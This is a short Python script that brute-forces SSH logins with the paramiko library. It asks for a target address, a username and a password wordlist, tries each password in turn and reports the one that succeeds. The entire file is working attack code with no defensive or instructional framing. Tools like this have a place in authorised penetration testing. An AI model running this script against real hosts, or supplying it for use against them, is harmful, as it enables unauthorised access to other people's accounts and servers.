import sys
import paramiko
import os
import socket
import termcolor
import time
start_time= time.time()
def ssh_connect(password, code=0):
    ssh= paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        ssh.connect(host,port=22, username=username,password=password)
    except paramiko.AuthenticationException:
        code = 1
    except socket.error as e:
        code=2
    ssh.close()
    return code


host=input('[+] Target Address: ')
username= input('[+] SSH Username: ')
input_file = input('Passwords File: ')
print('\n')
if os.path.exists(input_file)==False:
    print('The file does not exist')
    sys.exit(1)
with open(input_file) as file:
    for line in file.readlines():
        password= line.strip()
        try:
            response= ssh_connect(password)
            if response==0:
                print(termcolor.colored(('[+] Found password: ',password , 'for Account ',username),'green'))
                break
            elif response==1:
                print(termcolor.colored(('[+] Incorrect login :',password),'red'))
            elif response==2:
                print('[!] Can not connect')
                sys.exit(1)
        except Exception as e:
            print(e)
            pass
end_time=time.time()
print("Total time of execution: ",end_time-start_time)